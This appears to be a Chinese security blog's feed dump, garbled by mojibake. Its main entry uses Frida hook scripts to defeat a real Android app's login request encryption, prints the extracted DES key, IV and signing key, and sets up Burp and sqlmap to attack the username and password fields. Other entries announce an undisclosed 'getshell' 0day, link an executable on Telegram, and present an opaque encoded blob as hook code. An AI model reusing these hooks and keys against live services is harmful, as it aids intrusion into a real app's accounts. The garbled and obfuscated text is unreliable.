<span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES/CBC/PKCS5Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>deCipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES/CBC/PKCS5Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </code></pre>    <ul><li>é‡ç‚¹å°±æ˜¯RequestUtil.encodeDesMap  </li></ul>    <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">  Java.perform(function () &#123; &#x2F;&#x2F;javaå±‚çš„hookä»£ç var jsonRequest&#x3D; Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;);console.log(&quot;test&quot;);jsonRequest.encodeDesMap.overload(&#39;java.lang.String&#39;, &#39;java.lang.String&#39;, &#39;java.lang.String&#39;).implementation&#x3D;function (data,key,iv)&#123;console.log(data);return this.encodeDesMap(data,key,iv);&#125;&#125;);  </code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131104677.png" alt="é‡ç‚¹æµç¨‹æˆªå›¾"></p>  <ul><li>ç°åœ¨sginæ˜¯ä¸çŸ¥é“æ€ä¹ˆæ¥çš„çœ‹çœ‹  signå€¼å¦‚ä¸‹  </li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131105180.png" alt="signåŠ å¯†æµç¨‹"></p>  <ul><li>String checkCode = Utils.md5(builder.toString()).toUpperCase();    addMap.put("sign", checkCode);  </li></ul>  <h2 id="ç¼–å†™firda-hookä»£ç "><a href="#ç¼–å†™firda-hookä»£ç " class="headerlink" title="ç¼–å†™firda hookä»£ç "></a>ç¼–å†™firda hookä»£ç </h2><p>  hookä»£ç </p>  <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">  Java.perform(function () &#123; &#x2F;&#x2F;javaå±‚çš„hookä»£ç var Utils&#x3D; Java.use(&quot;com.dodonew.online.util.Utils&quot;);console.log(&quot;testaa&quot;);Utils.md5.implementation&#x3D;function (data)&#123;console.log(&quot;signæ•°æ®:&quot;+data);var md5&#x3D;this.md5(data);console.log(md5);return md5;&#125;var RequestUtil&#x3D; Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;);console.log(&quot;test&quot;);RequestUtil.encodeDesMap.overload(&#39;java.lang.String&#39;, &#39;java.lang.String&#39;, &#39;java.lang.String&#39;).implementation&#x3D;function (data,key,iv)&#123;console.log(&quot;è¦åŠ å¯†çš„æ•°æ®:&quot;,data);var encodeData&#x3D; this.encodeDesMap(data,key,iv);console.log(encodeData);return encodeData;&#125;&#125;);  </code></pre><h2 id="åŠ å¯†æµç¨‹åˆ†æ"><a href="#åŠ å¯†æµç¨‹åˆ†æ" class="headerlink" title="åŠ å¯†æµç¨‹åˆ†æ"></a>åŠ å¯†æµç¨‹åˆ†æ</h2>  <ul><li>signæ•°æ®:equtype=ANDROID&loginImei=Androidnull&timeStamp=1676112935252&userPwd=111&username=111125563&key=sdlkjsdljf0j2fsjkde729eee7e7c53f220292712c686b94dè¦åŠ å¯†çš„æ•°æ®: {"equtype":"ANDROID","loginImei":"Androidnull","sign":"DE729EEE7E7C53F220292712C686B94D","timeStamp":"1676112935252","userPwd":"111","username":"111125563"}NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii/UNcdXYMk0EHdbdwRDGADPvJlZMZqsYcRLgBo9ZcfD+QFQcNIEUonlHHkJ40A/3P/7z+jmJS0Tr3kaMU/y5tVOjyDyQIAskXC+ZknputIDnDC1V23cu2PAeGn/EnUn367Pj0cdcOVWQ1k+Rg4qybOMnYUVOLvG8SA==<p>æ€»ä½“æµç¨‹æ˜¯ </p><p>md5(equtype&#x3D;ANDROID&amp;loginImei&#x3D;Androidnull&amp;timeStamp&#x3D;1676112935252&amp;userPwd&#x3D;111&amp;username&#x3D;111125563&amp;key&#x3D;sdlkjsdljf0j2fsjk)  è‡³äºæ˜¯ä¸æ˜¯æ ‡å‡†çš„md5æš‚ä¸çœ‹</p><p>ç„¶ååœ¨æŠŠæ•°æ®å˜æˆjsonæ•°æ®</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131108917.png" alt="åŠ å¯†æµç¨‹æˆªå›¾"></p><pre class="language-åˆ†æä»£ç " data-language="åˆ†æä»£ç "><code class="language-åˆ†æä»£ç ">keyæ˜¯md5ä»¥å å¼„æˆåå…­è¿›åˆ¶iv æ˜¯ç›´æ¥åå…­è¿›åˆ¶public static final String BASE_DES_IV &#x3D; &quot;32028092&quot;;  &#x2F;&#x2F;å­—ç¬¦ä¸²public static final String BASE_DES_KEY &#x3D; &quot;65102933&quot; &#x2F;&#x2F;å­—ç¬¦ä¸²this.enCipher &#x3D; Cipher.getInstance(&quot;DES&#x2F;CBC&#x2F;PKCS5Padding&quot;);this.deCipher &#x3D; Cipher.getInstance(&quot;DES&#x2F;CBC&#x2F;PKCS5Padding&quot;);key:c3d26dca86259782bd9186481f892ae6       Hex byteiv:3332303238303932                          hex byte</code></pre><h2 id="ä½¿ç”¨å·¥å…·æ¨¡æ‹Ÿè§£å¯†è¯·æ±‚æ•°æ®åŒ…"><a href="#ä½¿ç”¨å·¥å…·æ¨¡æ‹Ÿè§£å¯†è¯·æ±‚æ•°æ®åŒ…" class="headerlink" title="ä½¿ç”¨å·¥å…·æ¨¡æ‹Ÿè§£å¯†è¯·æ±‚æ•°æ®åŒ…"></a>ä½¿ç”¨å·¥å…·æ¨¡æ‹Ÿè§£å¯†è¯·æ±‚æ•°æ®åŒ…</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131109046.png" alt="å·¥å…·æ¨¡æ‹Ÿè§£å¯†åŠ å¯†æ•°æ®"></p><h2 id="ç¼–å†™hookè„šæœ¬åœ¨bpå¯ä»¥å¯¹æ˜æ–‡è¿›è¡Œä¿®æ”¹"><a href="#ç¼–å†™hookè„šæœ¬åœ¨bpå¯ä»¥å¯¹æ˜æ–‡è¿›è¡Œä¿®æ”¹" class="headerlink" title="ç¼–å†™hookè„šæœ¬åœ¨bpå¯ä»¥å¯¹æ˜æ–‡è¿›è¡Œä¿®æ”¹"></a>ç¼–å†™hookè„šæœ¬åœ¨bpå¯ä»¥å¯¹æ˜æ–‡è¿›è¡Œä¿®æ”¹</h2>  <ul><li>æ—¢ç„¶å…ˆç»è¿‡md5ç„¶åæˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªè„šæœ¬è®©ä»–ç»è¿‡bpæ¥ä¿®æ”¹è¿›è¡Œæµ‹è¯•  å‚è€ƒè„šæœ¬https://github.com/L3B1anc/simpleencrypt</li></ul>  <ul><li>ä¿®æ”¹ä¸€ä¸‹æˆ‘ä»¬  æ ¸å¿ƒä»£ç </li></ul>  <pre class="language-none"><code class="language-none">     send(string)      var op &#x3D; recv(function(value) &#123;    console.log(&quot;&lt;li&gt; js recv encryptdata content: &quot; + value);    string &#x3D;  value;&#125;);op.wait();    </code></pre>  <ul><li>hook.js    ç¼–å†™è¿™ä¸ªæ˜¯é‡ç‚¹æ³¨æ„ æ–¹æ³•å†…ä¿®æ”¹å±äºå€¼ä¼ é€’æ‰€ä»¥éœ€è¦å§ç”¨æˆ·åå’Œå¯†ç å•ç‹¬æå–å‡ºæ¥è¿›è¡Œèµ‹å€¼ä¿®æ”¹  ä»£ç å¦‚æˆªå›¾</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131110884.png" alt="hook.jsä»£ç "><br>  <ul><li>frida_hook.py </li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131111483.png" alt="frida_hook.py"></p>  <ul><li>trace.py è„šæœ¬</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131113997.png" alt="trace.py"></p><h2 id="å®æˆ˜hookä¿®æ”¹æ˜æ–‡"><a href="#å®æˆ˜hookä¿®æ”¹æ˜æ–‡" class="headerlink" title="å®æˆ˜hookä¿®æ”¹æ˜æ–‡"></a>å®æˆ˜hookä¿®æ”¹æ˜æ–‡</h2>  <ul><li>å¯åŠ¨frida  server  æ€ä¹ˆå®‰è£…å’Œå¯åŠ¨æƒ…å†µåšå®¢é‡Œé¢çš„æ•™ç¨‹ã€‚å…ˆè¿è¡Œfrida-hook.pyè„šæœ¬ åœ¨è¿è¡Œtrace.pyè„šæœ¬ </li></ul><ul><li>frida-hook.py è¿è¡Œç•Œé¢</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131114596.png"><br>  <ul><li>trace.py  è¿è¡Œç•Œé¢</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131200366.png"><br>  <ul><li>é…ç½®å¥½bpä»£ç†æ‰‹æœºç‚¹å‡»ç™»å½•</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131202132.png" alt="bpä»£ç†é…ç½®"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131207335.png" alt="hookåæ•°æ®æˆªå›¾"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131208424.png" alt="è½¯ä»¶è§£å¯†"></p>  <ul><li>è¿™å°±å¯ä»¥æµ‹è¯•äº†</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131209919.png" alt="bpæµ‹è¯•"></p><h2 id="è‡ªåŠ¨åŒ–å¯¹åŠŸèƒ½è¿›è¡Œæµ‹è¯•-frida-RPCä¸»åŠ¨è°ƒç”¨"><a href="#è‡ªåŠ¨åŒ–å¯¹åŠŸèƒ½è¿›è¡Œæµ‹è¯•-frida-RPCä¸»åŠ¨è°ƒç”¨" class="headerlink" title="è‡ªåŠ¨åŒ–å¯¹åŠŸèƒ½è¿›è¡Œæµ‹è¯•(frida  RPCä¸»åŠ¨è°ƒç”¨)"></a>è‡ªåŠ¨åŒ–å¯¹åŠŸèƒ½è¿›è¡Œæµ‹è¯•(frida  RPCä¸»åŠ¨è°ƒç”¨)</h2>  <ul><li>å¦‚ä½•è¿›è¡Œè‡ªåŠ¨åŒ–æµ‹è¯•å‘¢æ¯”å¦‚æˆ‘ç”¨sqlmap å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæµ‹è¯•å¦‚ä½•è¿›è¡Œã€‚è¿™æ—¶å€™å°±ä¸ç”¨hookäº†æˆ‘ä»¬ä½¿ç”¨rpcä¸»åŠ¨è°ƒç”¨æ¥æµ‹è¯•æ‰§è¡Œã€‚éœ€è¦ä¿®æ”¹trace.py  å¢åŠ pythonå‘åŒ…è¯·æ±‚æ·»åŠ rpcä¸»åŠ¨è°ƒç”¨  </li></ul>  <ul><li>firdaå¼€å¯è¿œç¨‹ç›‘å¬æ¨¡å¼</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131212809.png" alt="fridaè¿œç¨‹ç›‘å¬"></p>  <ul><li>ä¿®æ”¹åçš„trace.pyä»£ç æˆªå›¾  å…³é”®ä»£ç æˆªå›¾</li></ul>     <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131213141.png" alt="ä¿®æ”¹åçš„trace.pyä»£ç æˆªå›¾"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131214712.png" alt="è¿è¡Œtrace.py"><br>  <ul><li>è‡³æ­¤å°±å¯ä»¥ä»»æ„è¿›è¡Œæµ‹è¯•äº†</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131215079.png" alt="è‡ªåŠ¨åŒ–æµ‹è¯•æˆªå›¾"></p>  <ul><li>å®Œæ•´ä»£ç ä»¥åŠæµ‹è¯•app å†…éƒ¨æ”¾å‡º</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131216648.png" alt="å®Œæ•´ä»£ç ä»¥åŠæµ‹è¯•app"></p>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChatGptä½¿ç”¨å’Œæ³¨å†Œ|ChatGpt-C#å®¢æˆ·ç«¯</title>
      <link href="/chatgpt/2023/02/articles/5f434729a12aeff4/"/>
      <url>/chatgpt/2023/02/articles/5f434729a12aeff4/</url>
      
        <content type="html"><![CDATA[<h1 id="ChatGptæ³¨å†Œ"><a href="#ChatGptæ³¨å†Œ" class="headerlink" title="ChatGptæ³¨å†Œ"></a>ChatGptæ³¨å†Œ</h1> <ul><li>å‚è€ƒæ–‡ç« :https://baijiahao.baidu.com/s?id=1757224229351914188&wfr=spider&for=pc</li></ul><h2 id="ChatGptå®¢æˆ·ç«¯ä½¿ç”¨"><a href="#ChatGptå®¢æˆ·ç«¯ä½¿ç”¨" class="headerlink" title="ChatGptå®¢æˆ·ç«¯ä½¿ç”¨"></a>ChatGptå®¢æˆ·ç«¯ä½¿ç”¨</h2>  <ul><li>æ³¨å†Œå¥½äº†ç„¶åå»ç½‘ç«™ç”Ÿæˆapikeyç„¶åæ‰“å¼€è½¯ä»¶çš„ChatGPTCS.exe.config é‡Œé¢çš„value="ä½ ç”³è¯·çš„key"</li></ul>  <h2 id="ChatGptæ¼”ç¤ºä½¿ç”¨"><a href="#ChatGptæ¼”ç¤ºä½¿ç”¨" class="headerlink" title="ChatGptæ¼”ç¤ºä½¿ç”¨"></a>ChatGptæ¼”ç¤ºä½¿ç”¨</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302081326727.png" alt="ChatGptæ¼”ç¤º"></p><h2 id="ChatGptä¸‹è½½"><a href="#ChatGptä¸‹è½½" class="headerlink" title="ChatGptä¸‹è½½"></a>ChatGptä¸‹è½½</h2>  <ul><li>ä¸‹è½½åœ°å€:https://t.me/SoftwareUpdateChannel/61</li></ul>]]></content>
      
      
      <categories>
          
          <category> ChatGpt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŒ—äº¬å‹¤äº‘æœŸåˆŠ0dayæ¼æ´-å¯shell</title>
      <link href="/0day/2023/02/articles/51b7e07325d69b2b/"/>
      <url>/0day/2023/02/articles/51b7e07325d69b2b/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>åŒ—äº¬å‹¤äº‘ç§‘æŠ€å‘å±•æœ‰é™å…¬å¸ æœŸåˆŠé‡‡ç¼–ç³»ç»Ÿã€ç¼–è¾‘éƒ¨åŠå…¬ç³»ç»Ÿã€ç¼–è¾‘éƒ¨åŠå…¬è‡ªåŠ¨åŒ–ã€ç½‘åˆŠå‘å¸ƒç³»ç»Ÿã€è¿œç¨‹å®¡ç¨¿ç³»ç»Ÿã€è¿œç¨‹æŠ•ç¨¿ç³»ç»Ÿã€è¯»è€…è®¢é˜…ç³»ç»Ÿã€æœŸåˆŠæœç´¢ã€å‹¤äº‘è½¯ä»¶ã€æœŸåˆŠåŠå…¬è‡ªåŠ¨åŒ–ã€‚</p><h2 id="æ¼æ´æˆªå›¾"><a href="#æ¼æ´æˆªå›¾" class="headerlink" title="æ¼æ´æˆªå›¾"></a>æ¼æ´æˆªå›¾</h2><p>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061656585.png" alt="æ¼æ´æˆªå›¾1"></p><p>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061657368.png" alt="æ¼æ´æˆªå›¾2"></p><h2 id="æºç æˆªå›¾"><a href="#æºç æˆªå›¾" class="headerlink" title="æºç æˆªå›¾"></a>æºç æˆªå›¾</h2><p>   <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061719127.png" alt="æºç æˆªå›¾"></p><h2 id="æ˜¯å¦åšä¸»ç‹¬ç«‹æŒ–æ˜"><a href="#æ˜¯å¦åšä¸»ç‹¬ç«‹æŒ–æ˜" class="headerlink" title="æ˜¯å¦åšä¸»ç‹¬ç«‹æŒ–æ˜"></a>æ˜¯å¦åšä¸»ç‹¬ç«‹æŒ–æ˜</h2><pre><code><pre class="language-none"><code class="language-none">   æ˜¯</code></pre></code></pre><h2 id="æ¼æ´è¯¦æƒ…"><a href="#æ¼æ´è¯¦æƒ…" class="headerlink" title="æ¼æ´è¯¦æƒ…"></a>æ¼æ´è¯¦æƒ…</h2><pre><code> <pre class="language-none"><code class="language-none"> éå…¬å¼€ </code></pre></code></pre>]]></content>
      
      
      <categories>
          
          <category> 0day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> 0day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç›´æ’­app è·å–rtmpæ’­æ”¾åœ°å€-è…¾è®¯æ’­æ”¾å™¨Frida-hook</title>
      <link href="/androidreverse/2023/01/articles/b9d040d0979b56be/"/>
      <url>/androidreverse/2023/01/articles/b9d040d0979b56be/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ†æapp"><a href="#åˆ†æapp" class="headerlink" title="åˆ†æapp"></a>åˆ†æapp</h1><ul><li>æŠŠappæ”¾åˆ°jadx é‡Œé¢æ‰¾åˆ°åŒ…åå¦‚ä¸‹å›¾<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101543624.png"></li><li>æ‰¾åˆ°å›¾ç‰‡é‡Œé¢çš„æ–¹æ³•<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101544176.png"></li><li>Hookå›¾ç‰‡é‡Œé¢çš„æ–¹æ³•<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101545128.png"></li></ul><h2 id="hookä»£ç "><a href="#hookä»£ç " class="headerlink" title="hookä»£ç "></a>hookä»£ç </h2>   <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">FoVplMzAwMTQ5NTI3ZTcyZTE0NzQ1YjUxMTUzZTgyNGE0ZmQ1Zjk0Yjg3Zjk4YjRmZWZmNTBhOGU4NGY0Y2YzMjk0OGRmNGM0NTM5MzA5ZWMwODlhYjExZDdiNWQ5MDhhZjNhMzg5NTJiNzJlOTRiNWM1YTEwYmY0Mzc4ZDJkMzcyYTQ0MjUzZjdlNjI1MDQ0Y2RjMTFlNjFmOTU1NGI3MTRkNWRiYzIwMzk0MGJhNGE4ZTNmYzZkYWU2ZTJmM2M3MThmOGU5ZWViZTRkNjNlZDMwZjJmZjRiYzViMzE3MmI1ZDE3NzI5ZTkyNmQ5NmUyYWYxMDFjZDhjOGQ3NDExNTQ4MWUxOTI1ZjA5YTVkODk2NzNhNDcwY2U3MjRjNTNkYzk1ZGUyMDFkNzNlNDAyODhmMTVmYmNkODM2YWM2Y2MyYWNiNGM4ZWFjNmFkYzM1NjA3ZWRlMmM0NmZmYzlkM2EwMDY2ZGExMTU4MTE4MTFhYTNmZjFlYTZkYzAxNTg4NTJhMjE4NTNiN2RlZjcyYjRkZmJjMzZlYjliMDk5NmYwZWM3YWIyOTU1M2Q0YTQzNWEwYWQxMTg1MTQ0NmVlOTBiNTgxYzYzNjExY2IxZjZhYTg2MWMxZDcxNzBkYjQ4NWQ1ZjI5ZmMyOWNlNjAwZWM4YTJjZjliZDk2NDUxM2I2YmVhNzhjMzk1MmEwY2UwN2ZiZmMyZmE0YmQyYzAzNmM0YmViMDgzMTBiYjU0NTJmMzM5NTE2NWY4Y2QxYjdmMWYyMmE3NzFlN2U1MWNmNzA1NzYxOTgyOTM5N2ZkNDYwODQ0MzNjMzYyMDlhODAyMGFlOGMxYTc0NDhmNzUzNGRlNGNiZjE5ZWM0ZDRiYTdmMTY0YzkyN2RlMWI0NTJjZjJmZDZkNjViMTg0NDdmY2I5NzBlNDAyYTdiZmU4NmMzMDdhYmM2OWU4ZGMzNmNkYzY4YjEwNmZlMjljMmJlMTlkNGFlZGRmN2QxNDcyNzEyZDhmMmM4Yjk1YjZlZTIzZDU4ZjdhYjhkODhhNDA4OTRlOWUwODU0MDM3ZTMxYzk2ZjlhNmE4Y2M5MzMwNDQ3M2RjOWY3NTZlNTU0OGZmZTU1MDQ4YjA5YzVkOWFkYzBiMDhiODRkMWQ1NDM2MzcwMmUxYmQzMDY2ZTMxZTQwYmJjNDMxYjVmMWY0YzhlYTkzNmQ0OTE0MmJkNDQ4ZDRkYzdlNjZhZDFiYjIwMDE4ZGIzY2YyMzUxMTgzOWM1Zjc0MmZhZGY0NDMyYzllZjRjOWU2Py   </code></pre><ul><li>æ•ˆæœ(å½“ç„¶å¾—æœ‰ä¸€å®šçš„fridaä½¿ç”¨åŸºç¡€)<br>   <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101549477.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> Frida </tag>
            
            <tag> Vip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FriDaå®‰è£…</title>
      <link href="/androidreverse/2023/01/articles/a94394783b10c35a/"/>
      <url>/androidreverse/2023/01/articles/a94394783b10c35a/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Frida æ˜¯ä¸€æ¬¾åŸºäº Python + JavaScript çš„ Hook ä¸è°ƒè¯•æ¡†æ¶ã€‚<br>Firda æ˜¯ä¸€æ¬¾æ˜“ç”¨çš„è·¨å¹³ Hook å·¥å…·ï¼Œ Java å±‚åˆ° Native å±‚çš„ Hook æ— æ‰€ä¸èƒ½ï¼Œæ˜¯ä¸€ç§ åŠ¨æ€ çš„æ’æ¡©å·¥å…·ï¼Œå¯ä»¥æ’å…¥ä»£ç åˆ°åŸç”Ÿ App çš„å†…å­˜ç©ºé—´ä¸­ï¼ŒåŠ¨æ€çš„å»ç›‘è§†å’Œä¿®æ”¹è¡Œä¸ºï¼ŒåŸç”Ÿå¹³å°åŒ…æ‹¬ Winã€Macã€Linuxã€Androidã€iOS å…¨å¹³å°ã€‚é™æ€äºŒè¿›åˆ¶æ’æ¡©ï¼šåœ¨ç¨‹åºæ‰§è¡Œå‰æ’å…¥é¢å¤–çš„ä»£ç å’Œæ•°æ®ï¼Œç”Ÿæˆä¸€ä¸ªæ°¸ä¹…æ”¹å˜çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©ï¼šåœ¨ç¨‹åºè¿è¡Œæ—¶å®æ—¶åœ°æ’å…¥é¢å¤–ä»£ç å’Œæ•°æ®ï¼Œå¯¹å¯æ‰§è¡Œæ–‡ä»¶æ²¡æœ‰ä»»ä½•æ°¸ä¹…æ”¹å˜ã€‚</p><h2 id="fridaå’Œå®‰å“å¹³å°ä»¥åŠpythonç¯å¢ƒå…³ç³»ä»‹ç»"><a href="#fridaå’Œå®‰å“å¹³å°ä»¥åŠpythonç¯å¢ƒå…³ç³»ä»‹ç»" class="headerlink" title="fridaå’Œå®‰å“å¹³å°ä»¥åŠpythonç¯å¢ƒå…³ç³»ä»‹ç»"></a>fridaå’Œå®‰å“å¹³å°ä»¥åŠpythonç¯å¢ƒå…³ç³»ä»‹ç»</h2><ul><li><p>ç”±äºfridaåŸºäºpythonæ‰€ä»¥è¦å®‰è£…pythonç¯å¢ƒã€‚ä¸åŒç‰ˆæœ¬çš„fridaåº”ç”¨ç‰ˆæœ¬ä¹Ÿä¸åŒä¾‹å¦‚:</p><ul><li>frida12.3.6 Android5-6 Python3.7 </li><li>frida12.8.0 Android7-8 Python3.8 </li><li>frida14+  Android9+ Python3.8</li></ul></li></ul><h2 id="pythonç¯å¢ƒå®‰è£…"><a href="#pythonç¯å¢ƒå®‰è£…" class="headerlink" title="pythonç¯å¢ƒå®‰è£…"></a>pythonç¯å¢ƒå®‰è£…</h2><ul><li><p>ç”±äºå®‰å“ç‰ˆæœ¬ä¸åŒæˆ‘ç”¨çš„å®‰å“æ˜¯å®‰å“10æ‰€ä»¥å®‰è£…çš„pythonç‰ˆæœ¬æ˜¯ 3.8ä»¥ä¸Šçš„ç‰ˆæœ¬</p><ul><li><p><a href="https://www.python.org/downloads/">pythonå®˜æ–¹ç½‘ç«™ä¸‹è½½</a><br> å¦‚ä¸‹å›¾ç›´æ¥é€‰æ‹©python3.8.6ä¸‹è½½å³å¯<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261942355.png" alt="pythonä¸‹è½½æˆªå›¾"></p></li><li><p><a href="https://www.cnblogs.com/lvtaohome/p/11121377.html">pythonå®‰è£…å‚è€ƒæ–‡ç« å¤ªç®€å•æˆ‘å°±ä¸æ¼”ç¤ºäº†</a>æ³¨æ„è¦æŠŠpythonåŠ å…¥ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­</p></li><li><p>å®‰è£…æˆåŠŸæ ‡å¿— å¦‚ä¸‹å›¾:<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261946578.png" alt="pythonå®‰è£…æˆåŠŸæ ‡å¿—"></p></li></ul></li></ul><h2 id="fridaä¸‹è½½å’Œå®‰è£…-pcå®¢æˆ·ç«¯"><a href="#fridaä¸‹è½½å’Œå®‰è£…-pcå®¢æˆ·ç«¯" class="headerlink" title="fridaä¸‹è½½å’Œå®‰è£…(pcå®¢æˆ·ç«¯)"></a>fridaä¸‹è½½å’Œå®‰è£…(pcå®¢æˆ·ç«¯)</h2><ul><li><p>pythonå®‰è£…frida pip install frida  è¿™æ ·å®‰è£…é»˜è®¤å®‰è£…æœ€æ–°ç‰ˆæœ¬å¦‚æœæƒ³æŒ‡å®šç‰ˆæœ¬å®‰è£…é‚£ä¹ˆåˆ°<a href="https://github.com/frida/frida/releases/">https://github.com/frida/frida/releases/</a> æŸ¥çœ‹ç‰ˆæœ¬å·å®‰å®‰è£…ä¾‹å¦‚<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261952214.png" alt="fridaç‰ˆæœ¬æŸ¥çœ‹"> pip install frida&#x3D;&#x3D;15.1.17   å…¶ä»–ç‰ˆæœ¬çš„è¯æŠŠ15.1.17æ›¿æ¢ä¸€ä¸‹å°±è¡Œäº†æˆ‘å°±æŒ‰æœ€æ–°ç‰ˆæœ¬æ¥è¯´äº†</p></li><li><p>å®‰è£…frida-tools ä¸‹å›¾ pip install frida-tools&#x3D;&#x3D;10.5.4<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261959609.png" alt="frida-toolsç‰ˆæœ¬">  </p></li><li><p>æ³¨æ„fridaç‰ˆæœ¬ä¸€å®šè¦å’Œfrida-toolså¯¹åº” å³15.1.7 å¯¹åº”çš„frida-toolsç‰ˆæœ¬æ˜¯ 10.5.4ã€‚å¸è½½çš„è¯æŠŠinstallæ”¹æˆuninstallå³å¯ pip uninstall frida-tools&#x3D;&#x3D;10.5.4</p></li><li><p>éªŒè¯frida æ˜¯å¦å®‰è£…æˆåŠŸæ ‡å¿—å¦‚ä¸‹å›¾ frida â€“v  import frida  æ²¡æœ‰æŠ¥é”™è¯´æ˜å®‰å“æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262015412.png" alt="éªŒè¯æ˜¯å¦æˆåŠŸ"></p></li></ul><h2 id="fridaä¸‹è½½å’Œå®‰è£…-ä¹Ÿå°±æ˜¯å®‰å“ç«¯æœåŠ¡ç«¯"><a href="#fridaä¸‹è½½å’Œå®‰è£…-ä¹Ÿå°±æ˜¯å®‰å“ç«¯æœåŠ¡ç«¯" class="headerlink" title="fridaä¸‹è½½å’Œå®‰è£…(ä¹Ÿå°±æ˜¯å®‰å“ç«¯æœåŠ¡ç«¯)"></a>fridaä¸‹è½½å’Œå®‰è£…(ä¹Ÿå°±æ˜¯å®‰å“ç«¯æœåŠ¡ç«¯)</h2><ul><li><p>é¦–å…ˆç¡®å®šæ‰‹æœºçš„å‹å·(adb shell getprop ro.product.cpu.abi) ç„¶ååœ¨fridaæœç´¢ä¸€ä¸‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262006695.png" alt="ç¡®å®šæ‰‹æœºå‹å·"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262010155.png" alt="ä¸‹è½½"></p></li><li><p>ä¸‹è½½å®Œæ¯•è§£å‹ç„¶åä½¿ç”¨æ¨é€adb push xxxxx &#x2F;data&#x2F;local&#x2F;tmp ç›®å½•ä¸‹ã€‚ç„¶åæ”¹åå¹¶ä¸”èµ‹äºˆæ‰§è¡Œæƒé™ chomd 777 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;fsarm64<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301081646285.png" alt="æ¨é€"></p></li><li><p>å¯åŠ¨sever 